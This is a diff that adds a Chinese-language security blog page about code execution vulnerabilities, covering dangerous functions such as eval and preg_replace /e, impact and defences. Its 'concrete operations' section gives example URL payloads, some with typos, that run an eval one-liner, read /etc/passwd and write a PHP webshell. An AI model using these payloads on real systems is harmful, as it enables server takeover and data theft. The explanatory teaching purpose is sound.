@@ -1,0 +1,61 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>代码执行漏洞 | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1>代码执行漏洞</h1><hr></div><div id="post-content"><p><strong>代码执行漏洞</strong></p>
+<ul>
+<li>什么是代码执行漏洞</li>
+</ul>
+<p>当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞</p>
+<ul>
+<li>漏洞产生的原因</li>
+</ul>
+<p>应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行</p>
+<ul>
+<li>相关函数</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python: <span class="built_in">exec</span></span><br><span class="line">php：<span class="built_in">eval</span>,assert,preg_replace(<span class="string">&#x27;/*/e&#x27;</span>,<span class="variable">$ret</span>=<span class="string">&quot;\\1&quot;</span>;<span class="string">&#x27;,$data);（PHP版本&lt;5.5.0）</span></span><br><span class="line"><span class="string">asp：eval,exevute.executeglobal</span></span><br><span class="line"><span class="string">jsp：jsp中没有php中的eval函数，但是可以使用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpEL，MVEL等</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>漏洞分类</li>
+</ul>
+<pre><code class="bash">换行代码的漏洞：eval assert
+callback函数：preg_replace + /e模式
+反序列化：unserialize()
+
+* 漏洞危害
+
+执行任意代码
+
+获取shell，甚至控制服务器
+
+* 具体操作
+
+```bash
+#一句话
+http://www.xXx.com/News/detai1/id/&#123;$&#123;@eval(S_ POST[a])&#125;&#125;
+#获取当前路径
+http://www.xxx.com/News/detail/id/&#123;$&#123;print(getd)))&#125;&#125;
+#读取文件
+http://www.xx.com/News/detail/id/&#123;$&#123;exit(var. dump(file_ get_ contents($_ POST[&#39;f&#39;])))&#125;&#125;    POST的数据为: f=/etc/passwd
+#写shell
+http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var._dump(file_ put_ contents($_ POST[&#39;f&#39;],$_POST[&#39;d&#39;])))&#125;&#125;   POST的数据为: f=1.php&amp;d=&lt;?php @eval($_ POST[&#39;aa&#39;])?&gt;
+
+* 防范方法
+
+严格控制eval()函数的使用
+
+字符串使用单引号包括可控代码,插入前使用addslashes转义
+
+放弃使用preg_ replace 的e修饰符,使用preg_ _replace_ callback()替换
+</code></pre>
+<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/07/23/AWD/">← Prev AWD攻防(持续)</a><span style="color: #fe2"> | </span><a href="/2021/07/23/mingling/">命令执行漏洞 Next →</a><hr></div><div id="bottom-btn"><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
+ el: '#Valine'
+ , appId: ''
+ , appKey: ''
+ , placeholder: '此条评论委托企鹅物流发送'
+})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Mr.Li</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">14</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">8</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">5</span></div></section></div><div id="aside-block"></div><footer style="text-align: right"><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>
